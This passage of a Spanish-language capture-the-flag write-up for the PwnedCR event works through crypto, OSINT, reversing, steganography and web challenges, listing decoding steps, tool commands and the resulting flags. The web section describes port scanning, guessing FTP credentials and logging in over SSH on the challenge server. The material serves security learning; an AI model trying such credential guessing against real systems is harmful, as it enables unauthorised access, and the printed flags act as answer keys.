-\nM&lt;C9I&gt;'4T4V%K6GI0;35A4FU+1$]J2T-2:TEU9W9+,FUR-'51,W0V0SEA87=K\nM&lt;6Y'&gt;DI'.7@T85)J;U=B&lt;W-U46EP1TYR;W%S&gt;5I','%O+TUY-4M,&gt;DQ+8C%,\nM2T=N2C99&lt;C1R37)*&lt;49Z.&amp;$P=4Y4270T,F)L8D]4&lt;'%N3VYS&gt;6]Y8D-V&gt;4DW\nM3VYP4T=U3%&lt;R&lt;#5R2FI,,G-N;S9Y:W`R575A=DAI&lt;'5:&lt;EE787EP1W-M&lt;C9Z\nM;7!E4W9,5TIQ3&amp;)5:4UE-6PT:E%Q.&amp;E/=6-Y&lt;6EC,GAL-T&lt;Q=$IU1FE*85EZ\nM2V$X:#5I&gt;&amp;UT0TAT-4-1:#=/8GDU0UAY-7%2&lt;4EE56TW4V)Y&lt;W%6&gt;4LR,7%C\nM87EI-3)L&gt;7-U=6I-,DMZ27E):7)E96E,3W8P3&amp;)0:W$R5'%P0U)H66EB=317\n=,FU.4W-N;W%Y:7)M.7@V*V%Q3$,R:&amp;,K4G(R,ST`\n`\nend\n</code></pre></div></div>\n\n<p>¿Qué es esto? Bueno si buscamos en Internet ‘<strong>begin 644 -</strong>’, encontraremos un tipo de codificación llamado <a href=\"https://en.wikipedia.org/wiki/Uuencoding\">Uuencoding</a>.</p>\n\n<p>Para decodificarlo podemos hacer uso de <a href=\"https://www.dcode.fr/uu-encoding\">esto</a>, lo colocamos sin las lineas de <code class=\"language-plaintext highlighter-rouge\">begin 644 -</code> y <code class=\"language-plaintext highlighter-rouge\">end</code> y presionamos <code class=\"language-plaintext highlighter-rouge\">decrypt</code> y nos da el siguiente resultado:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>r6ixu4SakZzPm5aRmKDOjKCRkIugvK2mr4uQ3t6C9aawkqnGzJG9x4aRjoWbssuQipGNroqsyZG0qo/My5KLzLKb1LKGnJ6Yr4rMrJqFz8a0uNTIt42blbOTpqnOnsyoybCvyI7OnpSGuLW2p5rJjL2sno6ykp2UuavHipuZrYWaypGsmr6zmpeSvLWJqLbUiMe5l4jQq8iOucyqic2xl7G1tJuFiJaYzKa8h5ixmtCHt5CQh7Oby5CXy5qRqIeUm7SbysqVyK21qcayi52lysuujM2KzIyIireeiLOv0LbPkq2TqpCRhYibu4W2mNSsnoqyirm9x6+aqLC2hc+Rr23=\n</code></pre></div></div>\n\n<p>Esto tiene mucha pinta a una cadena en base64 asi que utilizemos CyberChef otra vez.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/5.png\" width=\"600\" /></p>\n\n<p>Parece que algo nos falta algo…</p>\n\n<p>Intentando varias formas damos en el clavo con <code class=\"language-plaintext highlighter-rouge\">XOR Brute Force</code> ya que al final podemos ver la flag.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/6.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>PWND{enc0ding_1s_not_CRYPto!!}</p>\n</blockquote>\n\n<h1 id=\"osint\">OSINT:</h1>\n\n<h3 id=\"1-in-flames\">1. In flames!!:</h3>\n\n<blockquote>\n  <p>Descripción: Hidden in discord the first search is born. &lt;3</p>\n</blockquote>\n\n<p>Este reto es muy simple, lo que habia que hacer era encontrar la siguiente foto en el chat de discord, la cual tiene una cadena en base64.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/7.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>e2Nvbl9hbW9yfQ==</p>\n</blockquote>\n\n<p>La cual decodeada te da la flag.</p>\n\n<blockquote>\n  <p>PWND{con_amor}</p>\n</blockquote>\n\n<h3 id=\"2-ob\">2. OB:</h3>\n\n<p><img src=\"/assets/img/pwnedcr6/ob.gif\" width=\"300\" /></p>\n\n<blockquote>\n  <p>Descripción: The Temporal Loom is the heart of the Drive. It’s where raw time is refined into physical timeline. You can find it on the pwnedcr.com website!!</p>\n</blockquote>\n\n<p>Revisando el codigo fuente de la pagina <a href=\"www.pwnedcr.com\">pwnedcr</a> podemos encontrar algo muy interesante en el <a href=\"https://www.pwnedcr.com/js/main.js\">main.js</a></p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jmmm Smells like O.S.!.N.T, https://drive.google.com/drive/folders/1ZAcQsU4506OBabNBCvuUdgUB19bPxHDm\n</code></pre></div></div>\n\n<p>Revisando el folder de Google Drive, podemos encontrar muchos subdirectorios e imágenes… si tienen la <a href=\"https://sw.kovidgoyal.net/kitty/\">terminal Kitty</a>, hay un comando bastante útil para visualizar imágenes directamente desde la consola <code class=\"language-plaintext highlighter-rouge\">kitty +kitten icat *</code>. Con esto, podemos ver todas las imágenes de manera recursiva sin tener que revisar cada directorio una por una… (Debes ejecutar este comando en <code class=\"language-plaintext highlighter-rouge\">┌──(user㉿kaliBit)-[/]</code> para que busque de forma recursiva las imagenes).</p>\n\n<p><img src=\"/assets/img/pwnedcr6/8.png\" width=\"300\" /></p>\n\n<p>Podemos encontrar imágenes con nombres como <code class=\"language-plaintext highlighter-rouge\">Matrix0001.png</code> que contienen una cadena en base64. (Podemos deducir que los nombre de las imagenes tienen numeros en formato binario pero estan desordenados igual…)</p>\n\n<p>Para reconstruir el texto yo lo hice por prueba y error, de esta manera y con CyberChef llegamos a el siguiente resultado:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/9.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>PWND{Rebuild_in_the_timeline}</p>\n</blockquote>\n\n<h3 id=\"3-they-seem-but-they-are-not\">3. They seem but they are not!:</h3>\n\n<blockquote>\n  <p>Descripción: In 2008, Canadian Chris Neil was convicted… Wait, wait, he’s not the same, this character is super friendly and a good guy. We just immerse it in the matrix!\nAsk him about the flag!! Remember format PWND{}</p>\n</blockquote>\n\n<p>Nos dan la siguiente imagen.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/delriwS.png\" width=\"300\" /></p>\n\n<p>Al parecer la imagen tiene un efecto <strong>swirl</strong>, la podemos llevar a su estado normal con la <a href=\"https://www8.lunapic.com/editor/?action=swirl\">esta pagina</a></p>\n\n<p><img src=\"/assets/img/pwnedcr6/10.png\" width=\"300\" /></p>\n\n<p>XD, podemos ver que se trata de <strong>Ragab0t</strong> y al preguntarle por la flag en Discord nos da la flag.</p>\n\n<blockquote>\n  <p>PWND{_imperial_}</p>\n</blockquote>\n\n<h1 id=\"reversing\">Reversing:</h1>\n\n<h3 id=\"1-j-guy\">1. J-GUY:</h3>\n\n<blockquote>\n  <p>Descripción: Hello, the first steps of reversing.!!!</p>\n</blockquote>\n\n<p>Nos proporcionan <a href=\"/assets/img/pwnedcr6/Pwnedcr_app.jar\">este archivo</a> <code class=\"language-plaintext highlighter-rouge\">.jar</code>, una forma de reconstruir el contenido de este tipo de archivos es utilizando <a href=\"https://java-decompiler.github.io/\">JD-GUI</a>.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/11.png\" width=\"600\" /></p>\n\n<p>Podemos observar que esta esperando una cadena que sea igual a <code class=\"language-plaintext highlighter-rouge\">FrozenFox</code> para retornar esta cadena en base64.</p>\n\n<blockquote>\n  <p>RGVjb21waWxlcg==</p>\n</blockquote>\n\n<p>Al decodearla podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/12.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>PWND{Decompiler}</p>\n</blockquote>\n\n<h3 id=\"2-idk\">2. IDK:</h3>\n\n<blockquote>\n  <p>Descripción: Someone on the team wrote it. We still don’t know what it is. We only have an internal portion of it.\nmensaje_ofuscado = bytes([caracter ^ 0x5A for caracter in mensaje_codificado])</p>\n</blockquote>\n\n<p>Se nos proporciona <a href=\"/assets/img/pwnedcr6/pwnedcr.bin\">este archivo</a>. Al observar la pista <code class=\"language-plaintext highlighter-rouge\">bytes([caracter ^ 0x5A for caracter in mensaje_codificado])</code>, podemos notar que el mensaje ha sido sometido a una operación XOR con la clave <code class=\"language-plaintext highlighter-rouge\">0x5A</code>. Para devolverlo a su forma original, podemos utilizar CyberChef.</p>\n\n<p>Cargamos el archivo y aplicamos XOR con la key <code class=\"language-plaintext highlighter-rouge\">0x5A</code> y podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/13.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>PWND{rev3rs1ng_easy}</p>\n</blockquote>\n\n<h3 id=\"3-cr4zzy-byt3s\">3. Cr4zzy Byt3s:</h3>\n\n<blockquote>\n  <p>Descripción: Our cybernetic forth has been under siege by a horrendous monster that feeds on innocent bytes. Help us discover the key to destroy it!!</p>\n</blockquote>\n\n<p>Nos proporcionan <a href=\"/assets/img/pwnedcr6/chal\">este archivo ejecutable</a>.</p>\n\n<p>Para decompilar el ejecutable pueden utilizar <a href=\"https://ghidra-sre.org/\">Ghidra</a>, para asi tener una idea de las caracteristicas y las acciones que realiza dicho archivo.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/14.png\" width=\"600\" /></p>\n\n<p>Nos dirigimos a <code class=\"language-plaintext highlighter-rouge\">functions</code> –&gt; <code class=\"language-plaintext highlighter-rouge\">main</code>, esto para poder decompilar/ver el entry point del ejecutable. El cual es el siguiente:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/15.png\" width=\"600\" /></p>\n\n<p>Lo que podemos notar es que está comparando caracteres en hexadecimal para continuar con la ejecución del programa.</p>\n\n<p>Para pasar caracteres en hexadecimal como argumento podemos hacer lo siguiente:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>printf '\\x11\\x1c\\v\\x16@\\x1e\\x11[(e0\\x18\\x056CPg0\\\\\\x0e(\\x05+}\\x02\\x03\\x03s\\x12A' | ./chal | tr -d 'Nom nom! Gimme more bytes:'; echo\n</code></pre></div></div>\n\n<p><img src=\"/assets/img/pwnedcr6/16.png\" width=\"800\" /></p>\n\n<p>También podemos utilizar un script en Python:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>from pwn import *\n\np = process(\"./chal\")\np.send(b'\\x11\\x1c\\v\\x16@\\x1e\\x11[(e0\\x18\\x056CPg0\\\\\\x0e(\\x05+}\\x02\\x03\\x03s\\x12A')\n\nprint(p.readall().decode('utf-8', errors='ignore'))\n\n</code></pre></div></div>\n\n<blockquote>\n  <p>PWND{numb3rs_are_Danger0us_!!}</p>\n</blockquote>\n\n<p>Si encuentras un error como este al ejecutar el archivo:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/17.png\" width=\"800\" /></p>\n\n<p>Puedes evitarlo al usar un contenedor con Docker:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sudo docker pull ubuntu\nsudo docker run -it ubuntu bash\n</code></pre></div></div>\n\n<p>Dentro del contenedor ejecuta:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>apt update\napt install wget python3 pip\npip3 install pwntools (Por si quieres utilizar el script de python)\n</code></pre></div></div>\n\n<p>Puedes subir el archivo de la siguiente manera:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/18.png\" width=\"700\" /></p>\n\n<h1 id=\"stego\">Stego:</h1>\n\n<h3 id=\"1-rocinante\">1. Rocinante!!</h3>\n\n<blockquote>\n  <p>Descripción: El mundo de las letras es muy interesante.</p>\n</blockquote>\n\n<p>Nos dan <a href=\"/assets/img/pwnedcr6/Sancho.txt\">este archivo</a> que parece un archivo de texto común pero si le hacemos un <code class=\"language-plaintext highlighter-rouge\">cat</code> podemos ver que hay tabs y espacios al final del archivo…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/19.png\" width=\"700\" /></p>\n\n<p>Investigando un poco nos podemos dar cuenta que esta utilizando <code class=\"language-plaintext highlighter-rouge\">whitespace steganography</code>, una herramienta para poder ver el mensaje original es <a href=\"https://www.kali.org/tools/stegsnow/\">Stegsnow</a>.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">stegsnow -C Sancho.txt</code> –&gt; Con este simple comando podemos ver la flag.</p>\n\n<blockquote>\n  <p>PWND{Tiquicia}</p>\n</blockquote>\n\n<h3 id=\"2-frk-of-pil\">2. F*rk of PIL</h3>\n\n<p><img src=\"/assets/img/pwnedcr6/creepy.png\" width=\"400\" /></p>\n\n<blockquote>\n  <p>Descripción: We started with something basic to hide my tracks.</p>\n</blockquote>\n\n<p>Nos proporcionan <a href=\"/assets/img/pwnedcr6/creepy.png\">este archivo</a>, para resolver este reto podemos hacer uso de <code class=\"language-plaintext highlighter-rouge\">stegolsb</code>.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">stegolsb steglsb -r -i creepy.png -n 2 -o secret_output</code> –&gt; Comando para descubrir información a por medio del <code class=\"language-plaintext highlighter-rouge\">least significant bit</code>.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/20.png\" width=\"700\" /></p>\n\n<blockquote>\n  <p>PWND{Eas1_peasy_dud3}</p>\n</blockquote>\n\n<h3 id=\"3-welcome-sloth\">3. welcome Sloth!!</h3>\n\n<p><img src=\"/assets/img/pwnedcr6/pwnedcr1.jpeg\" width=\"200\" /></p>\n\n<blockquote>\n  <p>Descripción: La tenacidad del perezoso es sorprendente, lento pero muy decidido, lo intenta mil veces si es necesario pero no se rinde fácilmente</p>\n</blockquote>\n\n<p>Nos proporcionan <a href=\"/assets/img/pwnedcr6/pwnedcr1.jpeg\">este archivo</a>, podemos resolver este reto con la herramienta <a href=\"https://github.com/RickdeJager/stegseek\">stegseek</a>.</p>\n\n<p><code class=\"language-plaintext highlighter-rouge\">stegseek pwnedcr1.jpeg /usr/share/wordlists/rockyou.txt</code> –&gt; Con este comando podemos hacer bruteforcing para extraer los datos ocultos.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/21.png\" width=\"700\" /></p>\n\n<p>Este es el contenido:</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>50 57 4e 44 7b 48 61 79 74 61 6c 65 6e 74 6f 65 6e 43 52 7d\n</code></pre></div></div>\n\n<p>Utilizamos CyberChef con la receta <code class=\"language-plaintext highlighter-rouge\">From HEX</code> y vemos la flag:</p>\n\n<blockquote>\n  <p>PWND{HaytalentoenCR}</p>\n</blockquote>\n\n<h3 id=\"4-rollon\">4. RollON</h3>\n\n<blockquote>\n  <p>Descripción: This mix is based on meditation and energy gathering for BitBl4ck, it doesn’t get him out of his head.</p>\n</blockquote>\n\n<p>Nos dan <a href=\"/assets/img/pwnedcr6/arab_mix_2030.wav\">este archivo</a>, podemos utilizar la misma herramienta de antes <code class=\"language-plaintext highlighter-rouge\">stegolsb</code>.</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>stegolsb wavsteg -r -i arab_mix_2030.wav -n 2 -o extracted_flag.txt -b 32\n</code></pre></div></div>\n\n<p>De esta manera podemos ver la flag:</p>\n\n<p><img src=\"/assets/img/pwnedcr6/22.png\" width=\"700\" /></p>\n\n<blockquote>\n  <p>PWND{r3cuerd0_la_1er4_ch4mb4}</p>\n</blockquote>\n\n<h3 id=\"5-b3tch\">5. B3tch</h3>\n\n<p><img src=\"/assets/img/pwnedcr6/casaCR.png\" width=\"400\" /></p>\n\n<blockquote>\n  <p>Descripción: How nice it would be to have a house on the beach</p>\n</blockquote>\n\n<p>Nos dan <a href=\"/assets/img/pwnedcr6/casaCR.png\">este archivo</a>, vamos a ver los metadatos…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/23.png\" width=\"400\" /></p>\n\n<p>Vemos algo interesante en <code class=\"language-plaintext highlighter-rouge\">image description</code> que es <code class=\"language-plaintext highlighter-rouge\">online R7-G0-B7</code>, investigando un poco podemos toparnos con <a href=\"https://stegonline.georgeom.net/extract\">esta pagina</a> en la cual podemos subir la imagen.</p>\n\n<p>Una vez subida la imagen presionamos <code class=\"language-plaintext highlighter-rouge\">Extract Files/Data</code></p>\n\n<p><img src=\"/assets/img/pwnedcr6/24.png\" width=\"400\" /></p>\n\n<p>Una vez aqui ponemos los valores que vimos en <code class=\"language-plaintext highlighter-rouge\">image description</code>…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/25.png\" width=\"400\" /></p>\n\n<p>Precionamos <code class=\"language-plaintext highlighter-rouge\">Go</code> y podemos ver la flag.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/26.png\" width=\"400\" /></p>\n\n<blockquote>\n  <p>PWND{CTF}</p>\n</blockquote>\n\n<h3 id=\"6-relajasonic\">6. Relajasonic</h3>\n\n<blockquote>\n  <p>Descripción: Los sonidos del bosque son relajantes, para disfrutarlos hay que estar bien atento</p>\n</blockquote>\n\n<p>Nos dan <a href=\"/assets/img/pwnedcr6/AbreteSesamo.7z\">este archivo</a>, el cual esta comprimido y con contraseña.</p>\n\n<p>Vamos a intentar con la contraseña <code class=\"language-plaintext highlighter-rouge\">AbreteSesamo</code> ya que es el nombre del archivo…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/27.png\" width=\"700\" /></p>\n\n<p>LOL sirvio, el archivo comprimido contiene un archivo de audio, vamos a intentar ver el <code class=\"language-plaintext highlighter-rouge\">espectrograma</code> con <code class=\"language-plaintext highlighter-rouge\">Audacity</code>, para instalar Audacity pueden poner el siguiente comando <code class=\"language-plaintext highlighter-rouge\">sudo apt install audacity</code>.</p>\n\n<p>Nos dirigimos a <code class=\"language-plaintext highlighter-rouge\">File</code> para cargar el archivo.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/28.png\" width=\"700\" /></p>\n\n<p>Presionamos el nombre del archivo y despues <code class=\"language-plaintext highlighter-rouge\">Spectrogram</code>.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/29.png\" width=\"600\" /></p>\n\n<p>Con esto podemos ver la flag.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/30.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>PWND{Si_se_puede}</p>\n</blockquote>\n\n<h3 id=\"7-hack--eat-pinto\">7. Hack &amp; Eat Pinto!</h3>\n\n<p><img src=\"/assets/img/pwnedcr6/chal.png\" width=\"400\" /></p>\n\n<blockquote>\n  <p>Descripción: All this challenge solving and thinking got me hungry. I just want to solve this one so I can eat!</p>\n</blockquote>\n\n<p>Nos dan <a href=\"/assets/img/pwnedcr6/chal.png\">este archivo</a>, para resolver este reto vamos a usar <a href=\"https://github.com/zardus/ctf-tools/blob/master/stegsolve/install\">stegsolve</a>.</p>\n\n<p>Cargamos la imagen y vamos investigando los diferentes efectos… en el <code class=\"language-plaintext highlighter-rouge\">Red plane 0</code> podemos ver la flag.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/31.png\" width=\"400\" /></p>\n\n<blockquote>\n  <p>PWND{1_see_WITH_my_lIttI3_eye}</p>\n</blockquote>\n\n<h1 id=\"web\">Web</h1>\n\n<h3 id=\"1-ellingson-mineral-chapter-1\">1. Ellingson Mineral Chapter 1</h3>\n\n<blockquote>\n  <p>Descripción: Iniciando en pentest web? Lo basico es los recursos minerales.\nhttp://34.214.201.218/</p>\n</blockquote>\n\n<p>Nos dan una direccion ip <code class=\"language-plaintext highlighter-rouge\">http://34.214.201.218/</code> al cual es una pagina web.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/32.png\" width=\"600\" /></p>\n\n<p>Vamos a ver el codigo fuente y encontramos esto…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/33.png\" width=\"600\" /></p>\n\n<blockquote>\n  <p>UFdORHtUaDNNMG5leV9Hb2Rlc3MhfQ==</p>\n</blockquote>\n\n<p>Esa cadena en base64 es una flag.</p>\n\n<blockquote>\n  <p>PWND{Th3M0ney_Godess!}</p>\n</blockquote>\n\n<h3 id=\"2-ellingson-mineral-chapter-2\">2. Ellingson Mineral Chapter 2</h3>\n\n<blockquote>\n  <p>Descripción: Facil rigth? Todo es parte de conocer el entry point!!!</p>\n</blockquote>\n\n<p>Vamos a realizar un escaneo con <code class=\"language-plaintext highlighter-rouge\">nmap</code> para ver si hay mas puertos abiertos a parte del 80 (HTTP).</p>\n\n<p>Podemos encontrar los puertos 21 (FTP) y 22 (SSH).</p>\n\n<p>En el <code class=\"language-plaintext highlighter-rouge\">Chapter 1</code> se hace referencia al <code class=\"language-plaintext highlighter-rouge\">FTP</code> y al usuario <code class=\"language-plaintext highlighter-rouge\">margo</code> ademas la pagina tiene contraseñas, tal vez alguna de esas contraseñas es la del usuario margo para el servicio FTP…</p>\n\n<p><img src=\"/assets/img/pwnedcr6/35.png\" width=\"600\" /></p>\n\n<p>Probando las contraseñas podemos acceder al FTP con las credenciales <code class=\"language-plaintext highlighter-rouge\">margo:god</code>.</p>\n\n<p>Podemos listar y descargar los archivos que hay en el FTP adentro de la carpeta <code class=\"language-plaintext highlighter-rouge\">garbage</code>.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/34.png\" width=\"600\" /></p>\n\n<p>En el archivo <code class=\"language-plaintext highlighter-rouge\">stillnohandle.txt</code> podemos encontrar una cadena en base64 <code class=\"language-plaintext highlighter-rouge\">UFdORHtKMDN5V0BzSGVyZSF9</code> que es otra flag.</p>\n\n<blockquote>\n  <p>PWND{J03yW@sHere!}</p>\n</blockquote>\n\n<h3 id=\"3-ellingson-mineral-chapter-3\">3. Ellingson Mineral Chapter 3</h3>\n\n<blockquote>\n  <p>Descripción: same URL….. but……</p>\n</blockquote>\n\n<p>En el FTP tambien encontramos <a href=\"/assets/img/pwnedcr6/davinci.bin\">este archivo</a> llamado <code class=\"language-plaintext highlighter-rouge\">davinci.bin</code>, vamos a cargarlo en CyberChef…</p>\n\n<p>Al parecer es un archivo en C, pero sin compilar, ademas podemos ver credenciales.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/36.png\" width=\"800\" /></p>\n\n<p>Con esas credenciales podemos entrar al SSH.</p>\n\n<p><img src=\"/assets/img/pwnedcr6/37.png\" width=\"700\" /></p>\n\n<p>Decodeamos la cadena de base64 y tenemos la flag.</p>\n\n<blockquote>\n  <p>PWND{Wait!Cr@shand8urn!}</p>\n</blockquote>\n\n<hr />\n\n<p>Espero que les haya gustado este write-up :), nos vemos el proximo año en esta increible conferencia.</p>\n"
      } 
     
  
]